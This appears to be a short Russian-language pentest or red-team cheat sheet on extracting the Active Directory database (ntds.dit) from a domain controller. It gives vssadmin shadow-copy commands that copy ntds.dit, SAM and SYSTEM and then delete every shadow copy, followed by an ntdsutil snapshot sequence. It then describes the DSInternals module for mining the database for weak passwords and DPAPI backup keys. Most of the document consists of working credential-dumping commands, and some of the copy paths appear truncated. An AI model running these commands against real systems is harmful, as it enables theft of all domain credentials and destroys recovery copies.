# NTDS.dit

## Ручками

### vssadmin

```
Забираем базу ntds.dit с контроллера домена:
создадим теневую копию
win> vssadmin create shadow /for=c:
Копируем базу АД из теневой копии:
win> copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit .
Попутно экспортируем ветку реестра и пару файлов:
win> copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM .
win> copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SAM .
win> reg SAVE HKLM\SYSTEM c:\SYS
Удаляем теневые копии:
win> vssadmin delete shadows /All
```

### ntdsutil

```
win_serv> ntdsutil
win_serv> snapshot
win_serv> activate instance ntds
win_serv> create
win_serv> mount {GUID}
<забираем файлы>
win_serv> delete {GUID}
```

## DSInternals

link: [https://t.me/mis\_team/193](https://t.me/mis\_team/193)

DSInternals — [https://github.com/MichaelGrafnetter/DSInternals](https://github.com/MichaelGrafnetter/DSInternals)

Командлеты модуля позволяют работать с файлом ntds.dit в онлайн и оффлайн режиме. Чаще всего этот модуль используется системными администраторами для выявления пользователей, у которых пароль словарный, пустой или никогда не истекает.

Но для пентестера или RedTeam специалиста это тоже очень важно. Найти все учетные записи, у которых одинаковый несложный пароль или тех пользователей, у которых стоит Password Never Expires - совершенно реальные кейсы из жизни пентестера. Также модуль предоставляет возможно получить бэкапные ключи DPAPI.

Для тех, кому интересно почитать - [https://www.dsinternals.com/en/](https://www.dsinternals.com/en/) - блог про разные фишечки DSInternals
